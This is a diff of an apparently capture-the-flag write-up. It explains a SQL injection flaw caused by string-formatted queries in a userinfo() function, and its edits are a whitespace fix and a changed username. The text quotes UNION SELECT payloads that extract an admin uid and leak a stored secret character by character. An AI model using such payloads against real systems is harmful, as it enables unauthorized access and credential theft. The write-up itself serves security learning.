@@ -94,7 +94,7 @@ def get_username():
 
 They all use `con.execute("...?...", (var,)).fetchone()` but ours is different! We directly use a string format:
 ```py
-	infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query # here!
+infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query # here!
 ```
 
 Looking into this online, I found that con execute is secure against SQL injections, but unlike the rest, the one in `userinfo()` is not, these are sloppy mistakes that can be exploited!
@@ -138,7 +138,7 @@ Lets go to `/userinfo?user=' UNION SELECT 0, 0, 0, uid FROM Accounts WHERE userN
 Nice we got the admin's uid! (`15861`). Now we need to get the client secret. The issue however is that as we saw in the previous task, the client secret is a string, not a number. So we need somehow convert it to a number. What we'll do is convert the string into hex char by char and then convert it back via char codes:
 
 ```
-' UNION SELECT 0, 0, 0, unicode(substr(secret, {index}, 1)) FROM Accounts WHERE userName='InexpensivePlastic' --
+' UNION SELECT 0, 0, 0, unicode(substr(secret, {index}, 1)) FROM Accounts WHERE userName='SoggyPlate' --
 ```
 
 So lets run the [script](./genTargetToken.py) I made to automate this process
